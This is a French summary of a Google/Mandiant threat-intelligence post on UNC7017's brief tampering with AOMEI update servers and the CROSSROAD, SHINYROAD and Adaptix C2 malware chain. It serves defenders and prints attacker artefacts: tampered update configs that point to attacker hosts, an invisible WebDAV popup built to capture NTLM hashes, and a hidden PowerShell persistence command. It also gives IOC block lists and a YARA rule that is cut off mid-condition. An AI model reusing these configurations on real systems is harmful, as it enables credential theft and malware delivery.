---
title: "Investigating Ephemeral Supply Chain Tampering | Google Cloud Blog"
date: 2026-10-21
url: "https://cloud.google.com/blog/topics/threat-intelligence/investigating-ephemeral-supply-chain-tampering/"
authors: ["Tyler McLellan", "Google Threat Intelligence Group (Mandiant)"]
keywords: ["chaîne d'approvisionnement logicielle", "malware", "APT", "AOMEI", "threat intelligence", "C2"]
theme: "Sécurité"
tone: "research"
used_in: ["2026-10-21"]
---

## Résumé
Google Threat Intelligence Group (GTIG) et Mandiant documentent une campagne de compromission de chaîne d'approvisionnement logicielle visant l'infrastructure de mise à jour de l'éditeur AOMEI Technology (Backupper, AnyViewer), menée entre avril et juillet 2026 par un groupe baptisé UNC7017. Plutôt que de modifier durablement les serveurs de l'éditeur, l'attaquant altère les fichiers de configuration de mise à jour pendant des fenêtres extrêmement courtes (5 à 10 minutes) avant de restaurer les versions légitimes, rendant la détection quasi impossible par les méthodes classiques de triage ponctuel. La chaîne d'infection livre un nouveau downloader (CROSSROAD) puis une porte dérobée modulaire (SHINYROAD), combinés à une technique de vol d'identifiants NTLM via WebDAV et, plus tard, au déploiement du framework de post-exploitation Adaptix C2 déguisé en outils Nitro PDF. Des organisations de secteurs variés (IT, télécoms, enseignement supérieur) dans une douzaine de pays ont été touchées, la campagne ayant été initialement repérée grâce à la télémétrie EDR du ManageEngine Threat Analysis Lab (METAL).

## Points clés
- UNC7017 a mené un sabotage « éphémère » des serveurs de mise à jour d'AOMEI : des fenêtres de falsification de 5 à 10 minutes seulement, suivies d'un retour aux fichiers authentiques, ce qui déjoue les audits a posteriori et les scanners automatisés.
- La chaîne de charge utile comprend un nouveau downloader (CROSSROAD) qui valide l'environnement, se géolocalise (abandon si le pays détecté est la Chine) et installe une tâche planifiée pour déployer SHINYROAD, une porte dérobée modulaire basée sur un interpréteur Python embarqué (PocketPy) chargé par détournement de l'ordre de recherche de DLL dans l'outil légitime Radmin.
- L'infrastructure d'hébergement a évolué dans le temps : stockage Alibaba Cloud, puis domaines dédiés imitant la marque AOMEI (storage-data.com), puis bucket Google Cloud Storage utilisé spécifiquement pour contourner les filtres de proxy bloquant les domaines récemment enregistrés.
- Une technique additionnelle de captation d'identifiants a été introduite : une fenêtre popup invisible (1x1 pixel) pointant vers un chemin WebDAV, destinée à forcer la transmission de hachages NetNTLMv2 vers une adresse IP contrôlée par l'attaquant, sans action visible de l'utilisateur.
- En phase finale, les opérateurs déploient le framework de command-and-control Adaptix, masqué sous l'identité de l'outil Nitro PDF, pour assurer une persistance et un contrôle à distance supplémentaires.
- La remédiation côté serveur par AOMEI ne suffit pas : les terminaux ayant interrogé les serveurs pendant une fenêtre active restent compromis et nécessitent une chasse rétroactive (endpoint hunting) à l'aide des indicateurs et règles YARA fournis.

## Analyse approfondie

### Introduction
GTIG et Mandiant ont enquêté sur une campagne de compromission de chaîne d'approvisionnement logicielle ciblant l'infrastructure de mise à jour d'AOMEI Technology entre avril et juillet 2026. L'acteur a procédé à des altérations de configuration répétées et très brèves sur les serveurs d'origine d'AOMEI, chaque fenêtre de falsification ne restant active que cinq à dix minutes avant un retour aux versions authentiques. C'est la première fois que les équipes rencontrent une compromission de chaîne d'approvisionnement mise en œuvre avec des fenêtres aussi courtes, ce qui permet d'échapper efficacement au triage ponctuel traditionnel et aux analyses automatisées de fichiers.

La campagne a livré une chaîne de charge utile en plusieurs étapes impliquant un nouveau downloader, CROSSROAD, et une porte dérobée, SHINYROAD. L'acteur a fait évoluer ses méthodes au fil du temps, déplaçant son infrastructure de mise en scène des fournisseurs cloud vers des domaines dédiés puis vers du stockage cloud légitime, ce qui complique le blocage réseau par les défenseurs. Cette activité est attribuée à un cluster suivi sous le nom UNC7017.

D'après la télémétrie disponible, les organisations touchées couvrent des secteurs variés — services informatiques, télécommunications, enseignement supérieur — en Australie, au Brésil, en Inde, au Pakistan, au Portugal, à Singapour, en Afrique du Sud, en Espagne, en Suisse, en Turquie et aux États-Unis. Le ciblage semble toutefois opportuniste : tout système interrogeant les serveurs de distribution pendant les fenêtres actives pouvait être touché, donc l'étendue réelle des victimes dépasse probablement les organisations identifiées.

Cette campagne a d'abord été repérée grâce à une collaboration avec le ManageEngine Threat Analysis Lab (METAL), de Zoho Corporation, dont la télémétrie EDR a détecté l'activité fin mai dans plusieurs environnements clients. GTIG a ensuite notifié les organisations potentiellement affectées et partagé ses conclusions techniques avec AOMEI Technology, qui a indiqué avoir pris des mesures correctives pour sécuriser ses serveurs de distribution.

### Fonctionnement du système de mise à jour et de notification d'AOMEI
AOMEI Backupper fournit des services de sauvegarde, de clonage de disque et de reprise après sinistre, tandis qu'AnyViewer permet l'accès à distance. Ces logiciels s'appuient sur le flux de mise à jour ABMarket et ses services d'arrière-plan (`Backupper.exe` et `ABNotify.exe`), qui interrogent périodiquement des points distants en HTTPS pour obtenir des notifications de mise à jour et des fenêtres promotionnelles :

1. **Fichier de configuration de mise à jour** (`down_html.ini`) : le logiciel envoie une requête HTTPS vers `https://www2.aomeisoftware.com/download/abpopup/down_html.ini`. Ce fichier contient le numéro de version, le hachage MD5 du paquet de mise à jour attendu, et l'URL de téléchargement de `upgrade-now.zip`.
2. **Fichier de configuration des notifications** (`Notifycfg.ini`) : le logiciel contacte `https://account.aomeitech.com/Notifycfg.ini`. Ce fichier indique au processus de notification local (`ABNotify.exe`) quels messages afficher et spécifie les commandes ou programmes à exécuter depuis le répertoire local du logiciel.

En conditions normales, ces fichiers dirigent le client vers des fichiers officiels hébergés sur le domaine propre d'AOMEI (`www2.aomeisoftware.com`).

### Vue d'ensemble de la campagne
Plutôt que de maintenir une modification statique et persistante sur les serveurs de distribution de l'éditeur, UNC7017 a procédé à des falsifications de configuration répétées et très courtes. Plusieurs fenêtres de falsification ont été confirmées en 2026, accompagnées d'échantillons de malware observés dans la nature dès fin avril. Étant donné la brièveté de ces fenêtres, il est probable que d'autres altérations soient survenues sans avoir été détectées. Les systèmes consultant les mises à jour pendant une fenêtre active recevaient des instructions malveillantes, tandis que ceux interrogeant le serveur avant ou après recevaient les fichiers authentiques.

Pendant ces brèves fenêtres, l'acteur modifiait le fichier de configuration de mise à jour sur le serveur pour rediriger le logiciel vers le téléchargement d'un paquet ZIP malveillant hébergé sur des serveurs contrôlés par l'attaquant. Il altérait également le fichier de configuration des notifications pour abuser du service de notification automatique du logiciel, forçant le système à exécuter immédiatement le malware téléchargé. Si l'application d'un utilisateur vérifiait les mises à jour pendant que ces modifications étaient actives, elle téléchargeait et exécutait la mise à jour piégée.

Lorsque les fichiers de configuration altérés étaient actifs, l'acteur dirigeait les clients vers le téléchargement d'une archive ZIP armée contenant CROSSROAD, un downloader initial chargé de valider l'environnement et de préparer les composants secondaires. CROSSROAD établissait ensuite une persistance via tâche planifiée afin de déployer SHINYROAD, un framework de porte dérobée modulaire livré via des utilitaires d'administration piégés, pour assurer un commandement et contrôle (C2) discret.

#### Falsification en rafales courtes
Une caractéristique déterminante de la sécurité opérationnelle d'UNC7017 est son recours à des modifications de serveur éphémères et compressées dans le temps. Sur l'ensemble des vagues observées directement, l'adversaire a évité de laisser des configurations malveillantes résidentes sur les serveurs de mise à jour d'AOMEI :
- 28 mai : fenêtre d'exposition de 10 minutes (05h40–05h50 UTC)
- 16 juillet : fenêtre d'exposition de 6 minutes (08h33–08h39 UTC)
- 20 juillet : fenêtre d'exposition de 5 minutes (10h35–10h40 UTC)

À la fin de chaque fenêtre, UNC7017 restaurait les contenus légitimes de `down_html.ini` et `Notifycfg.ini`. Cela complique les audits post-incident des éditeurs, réduit la fenêtre pendant laquelle les défenseurs peuvent capturer des réponses serveur malveillantes en direct, et limite la compromission aux clients interrogeant le serveur exactement durant ces minutes.

#### Armement de la logique native de mise à jour : down_html.ini et « bloat » de configuration
Pour compromettre les terminaux sans exploiter de vulnérabilité logicielle, UNC7017 a abusé du flux légitime de mise à jour et d'affichage de popups du client AOMEI. Par défaut, le client télécharge les archives de mise à jour dans son répertoire `Tmphtml`, les décompresse dans le répertoire local `html/`, et traite les instructions de deux fichiers de configuration distants : `down_html.ini` et `Notifycfg.ini`.

Pour garantir que le client AOMEI accepte et extraie l'archive piégée `upgrade-now.zip`, UNC7017 incrémentait systématiquement le numéro de version mineure (« thrid ») et mettait à jour la somme MD5 attendue dans `down_html.ini` à chaque fenêtre de falsification :

```
[Date]
-Url=https://www2.aomeisoftware.com/download/abpopup/upgrade-now.zip
+Url=https://promotion.storage-data.com/download/abpopup/upgrade-now.zip
Name=upgrade-now
[Version]
maj=8
min=2
-thrid=5
+thrid=6
[MD5]
-Val=EE89C99F3753231771170F5D9CBBAE1E
+Val=31323E7E738230FA6A8DEEF2B7894666
```
*Falsification du 16 juillet de `down_html.ini`, redirigeant les téléchargements vers `promotion.storage-data.com` avec une version incrémentée (thrid=6) et un hachage MD5 synchronisé.*

Durant la fenêtre de 6 minutes du 16 juillet, UNC7017 a simultanément modifié `Notifycfg.ini` (SHA256 : d2f9ef2429312667f0512504b6a19ba4a9cc5514f1b2933923dd42f75a1c5934), en y injectant plus de 35 000 lignes de sections de configuration répétitives nommées `[dummy_XXXXXX]`. Ce « gonflement » extrême de la configuration était structuré pour outrepasser les vérifications de version standard du client, le forçant à déclencher une mise à jour quelle que soit sa version installée et à exécuter immédiatement le dropper CROSSROAD décompressé (`upgrade-now.exe`) depuis le répertoire local `html/`.

#### Évolutions de l'infrastructure
Entre avril et juillet 2026, UNC7017 a fait basculer son infrastructure de mise en scène et de livraison entre des buckets cloud publics et des domaines « sosies » contrôlés par l'acteur, probablement pour tester la livraison de charges utiles et se faire passer pour du trafic légitime de l'éditeur.

1. **Mise en scène cloud initiale (avril–mai 2026) :** les premières charges CROSSROAD (`upgrade-now.exe`, observé le 20 mai) s'appuyaient sur le stockage d'objets Alibaba Cloud (`serv.oss-cn-hongkong.aliyuncs.com`).
2. **Infrastructure de domaines dédiés (1er–7 juillet 2026) :** l'acteur est passé à des domaines dédiés thématisés autour de la marque de l'éditeur (`storage-data.com`, `promotion.storage-data.com`, `aomei.storage-data.com`).
3. **Répartition hybride de livraison cloud (20 juillet 2026) :** durant la fenêtre de 5 minutes du 20 juillet, l'acteur a modifié `down_html.ini` pour diriger les téléchargements initiaux du client vers un bucket Google Cloud Storage public (`storage.googleapis.com/aomeiupdate/upgrade-now.zip`) plutôt que vers `storage-data.com`. Ce choix tactique permettait au téléchargement initial de contourner les filtres de proxy d'entreprise bloquant les domaines récemment enregistrés (NRD), tandis que le chargeur CROSSROAD exécuté continuait d'utiliser `storage-data.com` pour la récupération de charges secondaires et les communications C2.

```
[Date]
Url=https://storage.googleapis.com/aomeiupdate/upgrade-now.zip
Name=upgrade-now
[Version]
maj=8
min=2
thrid=7
[MD5]
Val=BF73C4391B58CA95220CE3AE03F66DCF
```
*Modification du 20 juillet de `down_html.ini` utilisant Google Cloud Storage (thrid=7) pour contourner les blocages périmétriques sur les domaines récemment enregistrés (NRD).*

### Vol d'identifiants NTLM via WebDAV
Le 20 juillet, UNC7017 a introduit un second vecteur d'exploitation dans `Notifycfg.ini`. Avant la falsification, ce fichier affichait une bannière promotionnelle légitime de 400x380 pixels intitulée « World Cup Deals ». L'acteur l'a remplacée par une fenêtre invisible de 1x1 pixel (Width=1, Height=1), affectée d'une priorité d'exécution maximale (Priority=9999), instruisant le client d'afficher un fichier HTML distant via un chemin UNC WebDAV :

```
[PopWindow1]
ID=307
Title=20260408-AB Flash Sale (All Lang 不含EN)
Address="file://8.210.84.56/DavWWWRoot/campaign/24hour-flash-sale.html"
Width=1
Height=1
Priority=9999
```
*Configuration malveillante de `Notifycfg.ini` du 20 juillet, mettant en place une fenêtre popup invisible de 1x1 pixel pour forcer l'authentification WebDAV/NTLM vers `8.210.84.56`.*

En forçant le client AOMEI à requêter une ressource distante `file://` via WebDAV (`DavWWWRoot`), UNC7017 créait un mécanisme silencieux de collecte d'identifiants, capable de forcer les terminaux à transmettre des hachages d'authentification NetNTLMv2 vers l'adresse IP contrôlée par l'attaquant (`8.210.84.56`), sans que l'utilisateur en ait connaissance.

#### Livraison de malware et outillage de post-exploitation
Tout au long des vagues de la campagne, UNC7017 a déployé une chaîne cohérente de chargeurs personnalisés et de frameworks de post-exploitation commerciaux ou open source :
- **Évasion défensive par « timestomping » :** l'analyse d'un premier dropper CROSSROAD (`upgrade-now.exe`) soumis à VirusTotal le 20 mai a révélé que l'acteur avait manipulé les horodatages de compilation PE pour afficher de fausses dates de build de 2024, afin de complexifier l'analyse forensique chronologique.
- **Porte dérobée Radmin Server modifiée :** durant la vague du 28 mai, le chargeur non signé déposé dans le répertoire `html/` exécutait `rsetup64.exe /intsetup`, installant silencieusement une version modifiée de l'outil commercial d'administration à distance Radmin Server pour établir un accès distant persistant.
- **Intégration d'Adaptix C2 :** depuis début juillet 2026 au moins, l'acteur a été observé déployant le framework Adaptix C2 sur son infrastructure `storage-data.com`.

#### Le downloader principal : CROSSROAD
Le downloader principal de l'étape 2 (`upgrade-now.exe`, SHA256 : `9a58e8f49edf5644e5728f74cf36f560d3d486fa51db4db69d927963c7aca450`) est un exécutable Windows 64 bits écrit en C, suivi par GTIG sous le nom **CROSSROAD**. Livré dans `upgrade-now.zip`, CROSSROAD est chargé de valider l'environnement, de nettoyer les traces actives du terminal, de mettre en scène le paquet de charge secondaire et d'établir une persistance par tâche planifiée pour la suite de portes dérobées de l'étape 3.
- **Vérification de chemin :** dans sa routine de configuration, CROSSROAD vérifie si son chemin de fichier contient la chaîne `AOMEI`. Si elle est absente, il lance une routine d'auto-suppression, mais sans interrompre pour autant le nettoyage de configuration en arrière-plan ni ses routines de téléchargement.
- **Garde-fous d'exécution :** avant de procéder aux téléchargements secondaires, CROSSROAD applique deux contrôles principaux :
  - **Contrôle de géolocalisation :** il interroge des services DNS externes (`myip.opendns.com`, `o-o.myaddr.l.google.com`) et des services de réflexion HTTP (`checkip.amazonaws.com`, `api.ipify.org`, `ifconfig.me/ip`, `icanhazip.com`) avec des User-Agents personnalisés (`Anyviewer-loader/1.0`, `Anyviewer-ipcheck/1.0`). Dans certaines branches d'exécution, si le code pays retourné est `"CN"` (Chine), le chargeur interrompt son chemin d'exécution principal.
  - **Mutex de verrouillage :** il acquiert le mutex nommé `Global\{F9E6E3C0-E11A-4F85-9944-AF4AD6E05883}` pour empêcher plusieurs instances concurrentes sur le même hôte.
- **Réversion des artefacts locaux et anti-forensique :** pour complexifier le triage post-incident et la reconstruction forensique, le chargeur rétablit systématiquement les états de configuration locaux pendant son cycle d'exécution. Le malware analyse `down_html.ini` (situé à `<répertoire d'installation>\..\..\`), restaure le paramètre de version (`thrid`) à sa valeur par défaut de 5 et redirige l'URL de téléchargement de mise à jour vers l'infrastructure de distribution légitime d'AOMEI (`https://www2.aomeisoftware.com/download/abpopup/`).
- **Mise en scène et extraction de la charge de l'étape 3 :** si les contrôles d'environnement sont validés, CROSSROAD télécharge `https://promotion.storage-data.com/config/component.zip` (également observé sous le nom `en.zip`) vers `%TEMP%\svc<hex aléatoire>.tmp`, et décompresse son contenu dans le répertoire de données d'application locale de l'utilisateur à l'aide d'une bibliothèque miniz embarquée.
- **Persistance via tâche planifiée :** pour garantir l'exécution continue du paquet de charge mis en scène, `upgrade-now.exe` enregistre une tâche planifiée persistante nommée `RadminComponentRuntime` (avec la description « Radmin Component runtime checkable. »). La tâche est configurée pour exécuter `%LOCALAPPDATA%\Radmin\FamItrfc.exe --runtimechk` toutes les trois heures.
- **Auto-suppression (`--nitrod`) :** après extraction du paquet de charge et création de la tâche planifiée, CROSSROAD s'efface du disque. Pour contourner les restrictions de verrouillage de fichiers de Windows, l'exécutable dépose une copie de lui-même dans le répertoire temporaire et l'exécute avec le paramètre `--nitrod`, transmettant le PID du processus parent via `NITRODP` et le chemin de l'exécutable original via `NITRODT`. Le processus enfant attend la terminaison du parent, renomme le flux principal `:$DATA` du binaire original en un flux de données alternatif nommé `:wtfbbq` via `SetFileInformationByHandle`, puis signale `FileDispositionInfo` avec `DeleteFile = TRUE` pour détacher le binaire à la fermeture du handle.
- **Informations de version :** l'exécutable contient des métadonnées de version PE standard avec une coquille notable : `"ProductName: AOMEI Update Compent"`.

#### Charge de l'étape 3 : SHINYROAD et la suite Radmin
L'archive de charge décompressée par CROSSROAD dans `%LOCALAPPDATA%\Radmin\` contient un ensemble d'administration Famatech Radmin 3.x utilisé pour livrer le framework de porte dérobée modulaire **SHINYROAD**. Ce malware ne possède aucun mécanisme de persistance propre et dépend entièrement de la tâche planifiée externe enregistrée par CROSSROAD pour s'exécuter.
- **Exécution par détournement de l'ordre de recherche de DLL (`BlkScrDl.dll`) :** l'exécution débute lorsque la tâche planifiée persistante `RadminComponentRuntime` lance le binaire Radmin signé et légitime `%LOCALAPPDATA%\Radmin\FamItrfc.exe --runtimechk` (ou `FamItrf2.exe`). Au démarrage, l'exécutable Radmin est détourné pour charger la DLL non signée de l'attaquant, `BlkScrDl.dll`, via un détournement de l'ordre de recherche. L'adversaire a nommé cette DLL pour se faire passer pour la bibliothèque légitime de pilote « écran noir » de Radmin.
- **Mise en scène en mémoire partagée et serveur COM in-process :** à l'exécution, `BlkScrDl.dll` localise `config.zip` dans son répertoire d'exécution, mappe son contenu brut dans une section de mémoire partagée nommée `Local\963d3c60-d406-4ad6-aa1e-dc8e45061ccf`, et enregistre dynamiquement `csvc\RuntimeComponent.dll` comme serveur COM in-process sous le CLSID `{21191641-0D7F-4CD9-9572-01AAE6E7851B}` et l'AppID `{9AD3E98A-4C7E-4F37-982D-D73D41E4F91B}`.
- **Initialisation de l'étape 2 déclenchée par COM et VM PocketPy embarquée :** lorsque le processus Radmin instancie le CLSID enregistré, le sous-système COM de Windows charge la DLL. Celle-ci lit `config.zip` directement depuis la mémoire partagée, extrait la charge chiffrée `metadata.dat`, et la déchiffre à l'aide de ChaCha20 avec une clé et un IV dérivés par HMAC-SHA256. La charge déchiffrée est constituée de bytecode Python compilé, que `RuntimeComponent.dll` exécute au sein d'un interpréteur PocketPy embarqué, établissant une connectivité C2 initiale vers `8.218.65.184:443`.

#### Évolution de l'architecture de SHINYROAD
L'analyse de variantes antérieures de la campagne a révélé que SHINYROAD s'appuie sur des extensions C personnalisées (`_pyio_compat`, `_pyio_struct` et `pkpy`) pour éviter de charger les bibliothèques Python standard sur disque :
- **Protocole C2 binaire personnalisé :** les variantes antérieures communiquaient en TCP brut (`8.218.65.184:41397`). L'agent génère un identifiant unique en empreignant le nom d'hôte et le nom d'utilisateur, s'authentifie via une clé de handshake codée en dur, puis fait basculer dynamiquement toutes les communications suivantes vers un chiffrement symétrique dérivé de cet identifiant unique.
- **Capacités en mémoire :** le moteur prend en charge un accès shell interactif à distance (`os.system`), le « chaffing » de trafic (génération de paquets factices aléatoires pour perturber les signatures réseau), et une extension dynamique en mémoire via le gestionnaire de pool de threads `pkpy` sans écrire de modules de script sur disque.

#### Post-exploitation : thème Nitro PDF et Adaptix C2
Mi-juillet 2026, après le déploiement réussi de SHINYROAD, la télémétrie a identifié une activité d'étape ultérieure où UNC7017 a poussé ADAPTAGENT, la partie client du framework de post-exploitation Adaptix C2. Pour se fondre dans la masse ou paraître comme une activité initiée par l'utilisateur, ces charges se faisaient passer pour des outils promotionnels et de scan Nitro PDF (`NitroPromotion.exe`) :
- **Persistance :** le malware installait une tâche planifiée nommée `\NitroRuntime` qui exécutait :
`powershell -Command "Start-Process 'C:\Users\<USER>\AppData\Local\Temp\NitroPromotion.exe' -WindowStyle Hidden"`
- **Balisage Adaptix C2 :** l'exécutable chargeait par sideloading `Eztwain4.dll` (ADAPTAGENT) depuis `%LOCALAPPDATA%\Nitro Pro\`, établissant des balises périodiques toutes les deux minutes vers `8.210.84.56:6800`.

### Perspectives et implications
Cette campagne illustre une évolution plus large des méthodes d'attaque de la chaîne d'approvisionnement logicielle. Les intrusions de ce type se sont historiquement concentrées sur l'insertion de portes dérobées dans le code source ou l'altération des pipelines de build (par ex. SolarWinds, 3CX). Bien que très impactantes, ces compromissions laissent des signatures binaires persistantes dans les fichiers de release officiels, détectables par analyse binaire post-publication.

L'usage par UNC7017 d'une falsification de configuration éphémère représente une alternative à moindre coût opérationnel et à plus forte discrétion :
1. **Conception anti-analyse :** en limitant les modifications de configuration à des fenêtres de cinq à dix minutes, la grande majorité des utilisateurs légitimes et des robots d'analyse automatisés ne rencontrent que des fichiers authentiques, signés par l'éditeur.
2. **Exploitation sélective :** les acteurs peuvent compromettre sélectivement des organisations ayant des intervalles d'interrogation fréquents, tout en minimisant leur exposition sur l'infrastructure de l'éditeur.
3. **Approche à double volet :** combiner la redirection de mise à jour logicielle avec une captation WebDAV/NTLM invisible permet aux adversaires de récolter des identifiants auprès d'utilisateurs passifs, même si l'exécution de la charge binaire est bloquée.
4. **Récupération de logiciels commerciaux :** le déploiement de versions non modifiées d'outils d'administration légitimes (comme Radmin 3.x) pour masquer des canaux détournés par sideloading montre comment les adversaires mêlent des capacités de gestion à distance commerciales à des modules de porte dérobée cachés.

### Remédiation et renforcement
Les défenseurs devraient se concentrer sur le profilage comportemental des processus de mise à jour, en surveillant notamment les processus enfants non signés générés par les exécutants de mise à jour en arrière-plan et les redirections réseau non autorisées provenant de logiciels de bureau de confiance.

#### Notification de l'éditeur et renforcement de l'architecture
Le 17 juillet 2026, Mandiant a notifié AOMEI Technology de la falsification de configuration observée sur son infrastructure de mise à jour et a fourni les indicateurs pertinents. AOMEI a répondu le 29 juillet 2026, indiquant que des mesures correctives avaient été prises.

#### Pourquoi la remédiation côté serveur ne désinfecte pas les terminaux
Il est essentiel de noter que la remédiation côté serveur ne nettoie pas les terminaux ayant téléchargé des mises à jour malveillantes pendant les fenêtres de falsification antérieures. Comme la falsification s'est produite en rafales brèves, les systèmes ayant reçu ces fichiers peuvent rester compromis à l'insu de l'organisation, à moins qu'une chasse et une remédiation proactives des terminaux ne soient menées.
- **Charges résidentes persistantes :** les terminaux ayant interrogé les mises à jour pendant une fenêtre de falsification active ont téléchargé et mis en scène des charges persistantes (via des tâches planifiées) qui restent pleinement opérationnelles même après que l'éditeur a restauré les fichiers `.ini` authentiques sur les serveurs d'origine.
- **Cause racine obscurcie :** si l'activité de porte dérobée et les tâches planifiées qui en découlent génèrent une télémétrie détectable, le vecteur de livraison éphémère obscurcit le mécanisme d'intrusion initial. Comme la falsification du serveur n'a duré qu'environ 5 minutes — et que le chargeur restaurait activement les fichiers de configuration locaux — les enquêteurs examinant les URL de mise à jour de l'éditeur des heures plus tard n'observeront qu'une infrastructure authentique et bénigne, ce qui complique l'analyse de cause racine et l'identification du patient zéro.
- **Impératif de chasse :** les organisations utilisant des logiciels AOMEI ne peuvent pas supposer être protégées uniquement parce que l'éditeur a pris des mesures correctives côté serveur. Les équipes de sécurité doivent mener des chasses rétroactives au niveau des terminaux et du réseau sur toute la période d'avril à juillet, à l'aide des indicateurs et des règles YARA fournis dans ce billet.

#### Recommandations pour les éditeurs et développeurs de logiciels
La sécurité de la chaîne d'approvisionnement logicielle va au-delà des postes de travail des développeurs et des pipelines de build. Lorsqu'un logiciel de bureau s'appuie sur des fichiers de configuration distants pour gérer son comportement de mise à jour et de notification, les adversaires peuvent cibler la couche de distribution plutôt que le code source. Pour se défendre contre la falsification de configuration et le piratage du canal de distribution, les éditeurs devraient mettre en œuvre les contrôles suivants :
- **Vérification cryptographique de bout en bout des signatures :** les applications clientes doivent vérifier cryptographiquement les signatures Authenticode et valider les certificats de l'éditeur sur tous les exécutables et archives téléchargés avant extraction ou exécution. Les clients de mise à jour ne devraient jamais se fier uniquement au chiffrement de la couche transport (HTTPS) ou à des sommes de contrôle distantes (comme des valeurs MD5 en clair dans un fichier de configuration non authentifié).
- **Fichiers de configuration signés cryptographiquement :** les fichiers de configuration distants (.ini, .json ou .xml) devraient être signés numériquement avec une cryptographie asymétrique à clé publique. Si un serveur d'origine ou un CDN est modifié sans autorisation, le logiciel client détectera la signature invalide et rejettera la configuration.
- **Liste blanche de domaines et épinglage de destination :** les clients de mise à jour logicielle devraient imposer un épinglage strict des destinations, limitant les téléchargements de mise à jour aux seuls domaines et CDN officiels préapprouvés de l'éditeur, et rejeter toute redirection vers des domaines tiers arbitraires ou des buckets de stockage cloud publics génériques.
- **Restriction des schémas d'URI dans les gestionnaires embarqués :** les vues web embarquées, les popups promotionnelles et les gestionnaires de notification devraient imposer strictement des protocoles web sécurisés (`https://`) et interdire explicitement les schémas de fichier local (`file://`) et WebDAV UNC, afin de prévenir la captation d'identifiants NTLM externes.
- **Découplage des mises à jour essentielles des canaux marketing :** séparer les routines de maintenance logicielle essentielles des popups promotionnelles et bannières de notification dynamiques réduit la surface d'attaque et garantit que les canaux publicitaires ne peuvent pas déclencher d'exécution de code locale.
- **Surveillance de l'intégrité de l'origine et contrôles d'accès :** les serveurs web d'origine et les buckets de stockage d'objets hébergeant les métadonnées de mise à jour devraient imposer des contrôles d'accès stricts, l'authentification multifacteur, et une surveillance d'intégrité des fichiers (FIM) automatisée en temps réel avec alerte immédiate en cas de modification de configuration.

#### Recommandations pour les équipes de sécurité opérationnelle (SOC) et les répondeurs d'incident

##### Dépasser le piège du triage « ponctuel »
La nature en rafales courtes de cette attaque crée un défi unique pour la réponse à incident :
- **Le piège du triage :** lorsqu'une alerte EDR se déclenche pour un processus suspect généré par un outil de mise à jour, les analystes SOC tentent souvent de valider l'alerte en se rendant sur l'URL de téléchargement de l'éditeur ou en vérifiant la réputation de l'URL. Comme l'acteur restaurait les fichiers de configuration distants en cinq à dix minutes, le serveur de l'éditeur renvoie la plupart du temps des fichiers authentiques et propres, amenant les analystes à écarter à tort la détection comme un faux positif.
- **Protocole de réponse à incident actionnable :** les défenseurs ne doivent pas se fier aux vérifications web en direct. Les répondeurs à incident doivent préserver et analyser les fichiers de configuration mis en cache sur le terminal, situés dans `%PROGRAMFILES(X86)%\AOMEI\*\Tmphtml\`, et examiner la télémétrie proxy/pare-feu correspondant à la seconde exacte où l'alerte s'est déclenchée.

##### Activité de suite camouflée
Le déploiement d'Adaptix C2 sous couvert de Nitro PDF peut induire les analystes à traiter les alertes comme des téléchargements isolés initiés par l'utilisateur plutôt que comme un mouvement latéral mis en scène. Les répondeurs doivent remonter la filiation des processus de mise à jour pour identifier la falsification de chaîne d'approvisionnement à l'origine.

##### Actions de renforcement des terminaux et du réseau

**Vérifications de fichiers sur les terminaux**
Inspecter les systèmes pour les répertoires et artefacts suivants. Les défenseurs doivent distinguer les charges malveillantes des binaires signés légitimes détournés par détournement de l'ordre de recherche.

**Tâches planifiées et registre**
- Vérifier la présence de tâches non autorisées nommées `\NitroRuntime` ou `\RadminComponentRuntime`.
- Vérifier `\REGISTRY\MACHINE\SYSTEM\Software\Microsoft\TIP\AggregateResults\data` pour des blobs binaires inhabituels.

**Défenses réseau**
- Bloquer les connexions réseau sortantes vers `promotion.storage-data.com`, `aomei.storage-data.com`, `storage-data.com`, `8.210.84.56`, `47.239.60.117` et `8.218.65.184`.
- Bloquer le trafic SMB sortant (TCP 445) et WebDAV vers des adresses IP externes pour prévenir la captation d'identifiants NTLM.
- Inspecter les journaux proxy et de passerelle web pour le User-Agent `Anyviewer-loader/1.0` ou les requêtes vers le point de terminaison Alibaba Cloud OSS `serv.oss-cn-hongkong.aliyuncs.com`.

### Indicateurs de compromission (IOC)
Pour aider la communauté à chasser et identifier l'activité décrite dans ce billet, les indicateurs de compromission sont fournis dans une collection GTI pour les utilisateurs enregistrés, couvrant : les hachages de fichiers malveillants (SHA-256), les hachages de fichiers légitimes (SHA-256), les hachages des fichiers de configuration AOMEI (.ini), les indicateurs réseau, ainsi que les mutex et tâches planifiées suivants :
- **Mutex :** `Global\{F9E6E3C0-E11A-4F85-9944-AF4AD6E05883}`
- **Mapping de mémoire partagée :** `Local\963d3c60-d406-4ad6-aa1e-dc8e45061ccf`
- **Tâche planifiée :** `\RadminComponentRuntime`

### Google Security Operations (SecOps)
Les clients de Google Security Operations disposent de règles de détection couvrant cette activité sous les packs de règles « Mandiant Frontline Threats », « Mandiant Hunting Rules » et « Applied Threat Intelligence - Curated Prioritization », notamment :
- Explorer Launching Cmd With Powershell Start Process Command
- Suspicious Process Invoking Dllhost Clsid Invocation
- ATI Active Breach Rule Match for File IoCs
- ATI High Priority Rule Match for Ip Address IoCs
- ATI Medium Priority Rule Match for Ip Address IoCs
- Copy System Binary
- System32 Binary Copied to Non-Standard Directory

### Détections — règles YARA

```
rule G_APT_Downloader_CROSSROAD_1
{
	meta:
		author = "Mandiant"
		desc = "Detects obfuscated and masquerading UNC7017 CROSSROAD downloaders targeting AOMEI software update mechanisms"
		
	strings:
		// Masquerading & Metadata
		$meta_typo = "AOMEI Update Compent" wide
		$meta_co = "AOMEI International Network Limited" wide
		$meta_ver = "8.2.5.0" wide
		$meta_orig = "upgrade-now.exe" wide
		$meta_name = "upgrade-now" wide
		// Embedded Decompression & Downloader Artifacts
		$miniz1 = "archive is too large" ascii
		$miniz2 = "failed finding central directory" ascii
		$miniz3 = "unexpected decompressed size" ascii
		$whttp1 = "WinHttpCrackUrl" ascii
		$whttp2 = "WinHttpSendRequest" ascii
		// Obfuscation & Scheduled Task Artifacts
		$task1 = "RadminComponentRuntime" wide
		$task2 = "Radmin Component runtime checkable." wide
		$flag = "--runtimechk" wide
		$sob1 = "IsCurrentIpWhitelisted._sob_enc" ascii
		$sob2 = "DownloadFileFromUrlA._sob_enc" ascii
		$sob3 = "WinMain._sob_enc." ascii
		$obf_key = "_sob_key" ascii
	condition:
		uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and filesize < 5MB and (
			(($meta_typo or ($meta_co and ($meta_orig or $meta_name or $meta_ver))) and
			 any of ($miniz*) and
			 any of ($whttp*)) or
			(2 of ($sob*) and ($task1 or $flag)) or
